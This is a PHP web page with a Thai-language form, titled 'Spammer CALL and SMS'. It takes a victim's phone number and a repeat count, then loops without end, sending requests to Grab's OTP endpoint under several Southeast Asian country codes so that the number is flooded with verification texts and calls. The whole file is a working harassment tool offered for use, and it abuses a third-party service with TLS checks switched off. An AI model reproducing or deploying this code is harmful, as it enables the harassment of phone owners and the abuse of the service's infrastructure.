 <!DOCTYPE html> <html> <head>   <title>Spammer CALL and SMS</title>   <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">   <link href="dist/main.css" rel="stylesheet"><script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script src="dist/sweetalert2.min.js"></script><link href="https://fonts.googleapis.com/css?family=Kanit" rel="stylesheet"><link href="dist/dashboard.css" rel="stylesheet"> </head> <body><?phperror_reporting(0);set_time_limit(86400);if($_GET['do']=="send"){$num = $_POST['phone']; //attack_num // attack_type$attack_num = $_POST['attack_num'];$attack_numack = $_POST['attack_numack'];$attack_type = $_POST['attack_type'];$num = $_POST['phone'];$number = substr($num,1,9);$phone = "66".$number;$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];shuffle($countries);$ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");curl_setopt_array($ch, [	CURLOPT_RETURNTRANSFER => true,	CURLOPT_SSL_VERIFYPEER => false]);$last_success = ["SMS" => 0, "CALL" => 0];$white = 0;while (true) {	foreach ($countries as $countryCode) {		foreach (["SMS", "CALL"] as $method) {			if (strtoupper($attack_type) === "ALL" || strtoupper($attack_type) === $method) {				curl_setopt($ch, CURLOPT_POSTFIELDS, "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$phone."&templateID=&numDigits=5");				curl_exec($ch);				if (curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {					//echo date("[H:i:s]")." ".$method." OTP Requested.\n";					$white++;				}				if($white >= $attack_numack){?><script>swal(  'แจ้งเตือน',  'ทำรายการสำเร็จแล้ว',  'success')</script><?phpecho "<meta http-equiv='refresh' content='0;url=?can=reload'>";					}			}		}	}	sleep($attack_num);}}?><center>	<div style="background: white;border: solid 0.5px #9E9E9E;width: 80%;padding-right: 80px;padding-left: 80px;margin-top: 24px;padding-bottom: 500px;" class="d-flex p-0">					<div class="p-2" style="width: 30%;border-right: solid 0.5px #9E9E9E;"><br><div class="d-flex flex-column mb-3">  <a style="border-top: solid 0.5px" href="#" class="p-3 l-menu-active" align="left" >&nbsp;หน้าแรก</a></div>		</div>			<div class="p-2" style="width: 70%;">    <hr class="bar"><div style="width: 50%;border: solid 0.5px #9E9E9E;padding: 20px;"><form method="post" action="?do=send">Spammer CALL and SMS : <hr><input type="text" name="phone" placeholder="กรุณากรอกเบอร์" /><input type="text" name="attack_numack" placeholder="ยิงกี่ครั้ง" /><input value="5" type="text" name="attack_num" placeholder="หน่วงเวลา" />					<div class="form-group">						<label for="attack_type"></label>						<select class="form-control" id="attack_type" name="attack_type">							<option value="ALL">โทร และ ส่งข้อความ</option>							<option value="CALL">โทรอย่างเดียว</option>							<option value="SMS">ส่งข้อความอย่างเดียว</option>						</select>					</div><input type="submit" class="l-btn" value="เริ่ม" style="margin-top: 10px;"></form></div><div style="height: 20px;"></div></div>	</div></center><hr> </body> </html>	